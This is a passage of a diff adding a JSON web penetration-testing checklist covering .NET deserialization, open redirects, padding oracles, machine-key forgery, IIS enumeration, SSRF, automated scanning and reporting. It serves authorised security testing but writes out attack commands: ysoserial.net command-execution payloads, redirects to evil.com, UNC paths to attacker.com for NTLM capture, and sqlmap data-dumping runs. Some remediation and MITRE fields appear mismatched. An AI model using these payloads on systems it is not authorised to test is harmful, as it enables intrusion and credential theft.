+            "BinaryFormatter payload: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"whoami\"",
+            "Submit Base64-encoded BinaryFormatter payload in cookies or body parameters",
+            "Check for JavaScriptSerializer with SimpleTypeResolver (type disclosure in __type field)",
+            "DataContractSerializer with known type list: can arbitrary type be injected?",
+            "WCF endpoints (.svc): test with ysoserial WCF gadget chains"
+          ],
+          "expected": "TypeNameHandling=None in all Json.NET usage. BinaryFormatter disabled (.NET 7+ throws by default). Only safe types allowed.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "ysoserial.net",
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-03",
+          "name": "Open Redirect in .NET Applications",
+          "sev": "medium",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-601"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test redirect parameters in ASP.NET login, logout, and navigation flows for open redirect to external domains.",
+          "cases": [
+            "?ReturnUrl=https://evil.com \u2014 classic ASP.NET login redirect",
+            "?redirect=//evil.com (protocol-relative URL)",
+            "?next=https://evil.com | ?url=javascript:alert(1)",
+            "URL encoded: ?ReturnUrl=%2F%2Fevil.com",
+            "After login redirect: is ReturnUrl validated against internal paths only?",
+            "Bypass: ?ReturnUrl=https://target.com.evil.com (subdomain of target)",
+            "Bypass: ?ReturnUrl=https://target.com@evil.com (@ username trick)",
+            "Bypass: ?ReturnUrl=https://evil.com#https://target.com (fragment)"
+          ],
+          "expected": "ReturnUrl and all redirect parameters validated against allowlist of internal relative paths. External URLs rejected.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-04",
+          "name": "Padding Oracle Attack",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-326"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test for padding oracle vulnerability in ASP.NET applications using custom CBC-mode encryption.",
+          "cases": [
+            "Identify encrypted values in cookies or URL params (look for Base64 of multiples of 16 bytes)",
+            "Check .ASPXAUTH cookie if using non-default encryption settings",
+            "Modify a single byte in ciphertext \u2192 observe if error differs from other errors (oracle)",
+            "PadBuster: padbuster https://target.com/page ENCVALUE 8 -encoding 0 -cookie \"auth=ENCVALUE\"",
+            "POET (Padding Oracle Exploitation Tool) for automated testing",
+            "If oracle confirmed: PadBuster can decrypt ciphertext or encrypt arbitrary plaintext",
+            "ASP.NET specific: MachineKey-based encryption in older .NET WebForms apps"
+          ],
+          "expected": "No observable difference in error responses for valid vs invalid padding. Uniform error handling regardless of padding.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "PadBuster",
+            "POET",
+            "Burp Repeater"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-05",
+          "name": "Machine Key & Forms Auth Ticket Forgery",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-321"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test if the .NET machine key can be identified to forge Forms Authentication tickets, ViewState, or session data.",
+          "cases": [
+            "Check /web.config direct access \u2014 look for <machineKey validationKey=\"...\" decryptionKey=\"...\">",
+            "Check /elmah.axd error log \u2014 may contain config details or machine key info",
+            "Search GitHub for company machine key disclosure in committed configs",
+            "If machine key found: Blacklist3r \u2192 forge .ASPXAUTH cookie with arbitrary username + roles",
+            "ysoserial.net -g TypeConfuseDelegate -f ViewState -c \"whoami\" --path \"/path/page.aspx\" --apppath \"/\"",
+            "Test known default/weak machine keys list (publicly available databases)",
+            "Burp: replace .ASPXAUTH cookie with forged value \u2192 request authenticated page"
+          ],
+          "expected": "Machine key not exposed in any web-accessible file. No default or weak machine key used. Config files inaccessible.",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Blacklist3r",
+            "ysoserial.net",
+            "Burp Suite"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-06",
+          "name": "IIS Misconfiguration & Tilde Enumeration",
+          "sev": "medium",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-16"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test for IIS-specific misconfigurations: WebDAV, 8.3 filename disclosure, handler mappings, default pages.",
+          "cases": [
+            "IIS tilde enumeration: GET /~1/ HTTP/1.1 \u2192 IIS 8.3 short filename disclosure",
+            "GET /s~1/ \u2192 discover files starting with s (e.g. secret.aspx \u2192 s~1.asp)",
+            "OPTIONS / \u2192 check for WebDAV methods: PROPFIND, MKCOL, PUT, LOCK",
+            "PROPFIND / HTTP/1.1 \u2192 WebDAV discovery response",
+            "Check /iisstart.htm \u2014 default IIS welcome page = version disclosure",
+            "Handler mapping: try /file.aspx. (trailing dot) | /file.config.ashx",
+            "ASMX: try /?wsdl on .asmx endpoints \u2192 SOAP WSDL schema exposure"
+          ],
+          "expected": "WebDAV disabled. IIS tilde enumeration mitigated (URLScan or RequestFiltering). No default IIS pages. No WSDL in prod.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "curl",
+            "IIS Short Name Scanner"
+          ],
+          "command_template": "ffuf -w wordlist.txt -u \"{{URL}}FUZZ\" -mc 200,301,302,403",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-07",
+          "name": ".NET SSRF via HttpClient / WebClient",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1090 - Standard Technique"
+          ],
+          "mitre": [
+            "T1090"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test .NET-specific SSRF vectors including file:// protocol and UNC path NTLM credential capture.",
+          "cases": [
+            "Identify server-side URL fetching: HttpClient, WebClient, WebRequest, HttpWebRequest usage",
+            "File protocol: file:///C:/windows/win.ini in URL parameters",
+            "UNC path SSRF: \\\\attacker.com\\share\\ (triggers NTLM auth to attacker)",
+            "Responder to capture NTLM hash: responder -I eth0",
+            "AWS metadata: http://169.254.169.254/latest/meta-data/",
+            "Internal service discovery via SSRF: http://127.0.0.1:PORT (enumerate internal ports)",
+            "Test PDF generation features: load external URL in wkhtmltopdf or similar",
+            "Test: are DNS-only lookups possible (SSRF for internal hostname enumeration)?"
+          ],
+          "expected": "URL parameters validated against strict allowlist. UNC paths rejected. File protocol blocked. Cloud metadata unreachable.",
+          "recommendation": "Implement strict allowlist-based URL validation. Disable HTTP redirections on server-side requests and block requests targeting RFC 1918 private IP ranges and cloud metadata endpoints (169.254.169.254).",
+          "tools": [
+            "Burp Collaborator",
+            "interactsh",
+            "Responder (NTLM capture)"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"X-Forwarded-For: 127.0.0.1\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P11",
+      "name": "Automated Scanning",
+      "scope": "project",
+      "items": [
+        {
+          "id": "SCAN-01",
+          "name": "OWASP ZAP Passive & Active Scan",
+          "sev": "info",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Run ZAP passive scan during manual browsing and active scan after authentication is configured.",
+          "cases": [
+            "Configure browser to proxy through ZAP (127.0.0.1:8081)",
+            "Browse entire application while logged in as each user role",
+            "ZAP Alerts tab \u2192 review all passive findings (sort by Risk: High first)",
+            "For active scan: ensure authenticated session configured in ZAP",
+            "Right-click target \u2192 Active Scan \u2192 Configure scan policy",
+            "Use Ajax Spider first for SPA applications (React/Angular/Vue)",
+            "ZAP: Report \u2192 Generate Report \u2192 HTML format \u2192 save to /reports/",
+            "Verify all Medium+ alerts manually before including in report"
+          ],
+          "expected": "All ZAP findings reviewed and triaged. Real findings added to checklist. False positives noted.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "OWASP ZAP"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "SCAN-02",
+          "name": "Burp Suite Passive Scan Review",
+          "sev": "info",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Review Burp passive scan issues accumulated during manual browsing session.",
+          "cases": [
+            "Burp Dashboard \u2192 Issues \u2192 filter by Severity: High, Medium",
+            "Review for: mixed content, missing headers, weak cookies, info disclosure, CSRF",
+            "Target \u2192 Issues tab \u2192 per-host view of all passive findings",
+            "Burp Comparer: compare admin vs regular user responses for access control",
+            "Burp Sequencer: run on session tokens \u2192 FIPS analysis report",
+            "Right-click interesting requests \u2192 Scan for issues",
+            "Export Burp project file as backup: Burp \u2192 Save project"
+          ],
+          "expected": "All passive findings reviewed. Genuine findings added to checklist. Burp project file saved as evidence.",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Burp Suite"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "SCAN-03",
+          "name": "Nikto & Nuclei Automated Scans",
+          "sev": "info",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Run Nikto for web server misconfigs and Nuclei for known CVEs, exposures, and misconfigurations.",
+          "cases": [
+            "nikto -h https://target.com -ssl -output nikto_report.html",
+            "nikto: review missing headers, dangerous files, outdated software, known CVEs",
+            "nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_cves.txt",
+            "nuclei -u https://target.com -t misconfigurations/ -severity high,medium",
+            "nuclei -u https://target.com -t exposures/ -o nuclei_exposures.txt",
+            "nuclei -u https://target.com -t technologies/ (fingerprint)",
+            "Manually verify ALL Critical and High Nuclei findings before reporting"
+          ],
+          "expected": "All tool findings reviewed. Critical and High findings manually verified. No unverified findings in final report.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "nikto",
+            "nuclei",
+            "nuclei-templates"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "SCAN-04",
+          "name": "sqlmap Automated SQLi Scan",
+          "sev": "info",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Run sqlmap against all identified injection-susceptible endpoints for comprehensive SQL injection testing.",
+          "cases": [
+            "sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2",
+            "sqlmap POST: sqlmap -u URL --data='id=1&name=test' --batch",
+            "Cookie injection: sqlmap -u URL --cookie='id=1' --batch",
+            "Header injection: sqlmap -u URL --headers='User-Agent: *' --batch",
+            "All techniques: sqlmap -u URL --technique=BEUSTQ --batch",
+            "Save output: sqlmap -u URL --output-dir=./sqlmap-results",
+            "Review sqlmap log for confirmed injection points and dumped data"
+          ],
+          "expected": "No confirmed SQL injection vectors. All sqlmap tests return no vulnerable parameters.",
+          "recommendation": "Use parameterized queries (PreparedStatements / ORMs) for all database access. Never concatenate user input directly into SQL strings. Enforce database user least privilege.",
+          "tools": [
+            "sqlmap"
+          ],
+          "command_template": "sqlmap -u \"{{URL}}\" --batch --random-agent --banner",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P12",
+      "name": "Documentation",
+      "scope": "project",
+      "items": [
+        {
+          "id": "DOC-01",
+          "name": "Finding Documentation Template",
+          "sev": "info",
+          "mitre_tactic": "Impact",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Impact"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Document every confirmed finding with all required fields before moving to the next test.",
+          "cases": [
+            "Title: short descriptive name \u2014 \"SQL Injection in /api/search endpoint, id parameter\"",
+            "Affected URL + parameter: exact vulnerable URL and parameter name",
+            "Severity: Critical/High/Medium/Low/Info with CVSS 3.1 score",
+            "CWE Reference: CWE-89 (SQL Injection)",
+            "Description: what is the vulnerability, why it exists, what code path is affected",
+            "Steps to Reproduce: numbered steps, exact request/response with screenshots",
+            "Evidence: Burp request/response screenshot, HTTP request in code block",
+            "Impact: what attacker can achieve \u2014 data exfil, account takeover, RCE, DoS?",
+            "Remediation: specific technical fix with code example (use parameterized queries: cmd.Parameters.Add(...))",
+            "References: OWASP link, CWE link, CVE if applicable"
+          ],
+          "expected": "Every finding documented with all required fields. Evidence attached. Remediation specific and actionable.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Burp Suite screenshots",
+            "Flameshot/Greenshot",
+            "Report template"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DOC-02",
+          "name": "CVSS 3.1 Scoring for All Findings",
+          "sev": "info",
+          "mitre_tactic": "Impact",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Impact"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Calculate CVSS 3.1 base scores for each finding for objective severity comparison.",
+          "cases": [
+            "NVD CVSS calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+            "Base metrics: Attack Vector (N/A/L/P), Attack Complexity (L/H), Privileges Required (N/L/H), User Interaction (N/R), Scope (U/C), CIA impact (N/L/H)",
+            "Example: Unauthenticated SQLi = CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+            "Example: Stored XSS requiring auth = CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)",
+            "Map scores: 9.0-10.0=Critical, 7.0-8.9=High, 4.0-6.9=Medium, 0.1-3.9=Low",
+            "Document temporal metrics if applicable (exploit availability, remediation level)"
+          ],
+          "expected": "All findings have documented CVSS 3.1 base scores. Scoring consistent and defensible.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+            "first.org/cvss/calculator/3.1"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DOC-03",
+          "name": "Evidence Organisation & Chain of Custody",
+          "sev": "info",
+          "mitre_tactic": "Impact",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Impact"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Organise all evidence per finding with proper naming and hash verification.",
+          "cases": [
+            "Create /findings/F001-SQLi-search-endpoint/ folder per finding",
+            "Screenshots: annotate with red boxes on vulnerable areas",
+            "Burp: right-click request \u2192 Save item \u2192 save to findings folder",
+            "Burp: Copy as curl command \u2192 paste in finding for reproduction",
+            "ZAP: File \u2192 Save Session \u2192 keep as backup",
+            "sqlmap: --output-dir saves full output including extracted data",
+            "Video recording for complex multi-step findings (OBS Studio)",
+            "Hash evidence files: sha256sum evidence_file \u2192 document hash for integrity"
+          ],
+          "expected": "All evidence organised per finding. Each finding independently reproducible from documentation alone.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Greenshot",
+            "Flameshot",
+            "Burp Suite",
+            "OBS Studio"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DOC-04",
+          "name": "End-of-Engagement Cleanup",
+          "sev": "info",
+          "mitre_tactic": "Impact",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Impact"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Remove all test data, payloads, and test accounts from the application before leaving.",
+          "cases": [
+            "Remove ALL stored XSS payloads from comment fields, profiles, etc.",
+            "Delete ALL test user accounts created during testing",
+            "Remove ANY uploaded test files (web shells, SVG XSS, test images)",
+            "Delete test records: orders, posts, comments containing payloads",
+            "Verify no unintended persistent impact left in the application",
+            "Confirm with client: application functioning normally after testing",
+            "Export final Burp project file to /reports/ folder as backup",
+            "Export OWASP ZAP report to /reports/ folder",
+            "Compile final list of test accounts, what was tested, and what was removed"
+          ],
+          "expected": "Application in exact same state as before testing. All payloads and test data removed. Client confirmed no residual impact.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Application UI",
+            "Burp Suite",
+            "OWASP ZAP"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DOC-05",
+          "name": "Executive Summary & Final Report",
+          "sev": "info",
+          "mitre_tactic": "Impact",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Impact"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Write executive summary and compile final penetration test report.",
+          "cases": [
+            "Overall risk rating: Critical/High/Medium/Low (based on highest unmitigated finding)",
+            "Finding count by severity: X Critical, Y High, Z Medium, N Low, M Info",
+            "Key findings in business terms (no jargon): \"An attacker can log in as any user without knowing their password\"",
+            "Overall security posture vs industry benchmark (if applicable)",
+            "Top 3-5 prioritized remediation items with business impact",
+            "Positive findings: what security controls work well (good for client morale)",
+            "Testing methodology: tools used, scope tested, test dates, environment type",
+            "Appendix: full technical findings + CVSS scores + CWE references + OWASP references"
+          ],
+          "expected": "Executive summary understandable to non-technical C-suite. Full technical report with all findings, evidence, and remediation.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Report template",
+            "Word processor",
+            "LaTeX"
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    }
+  ]
+}
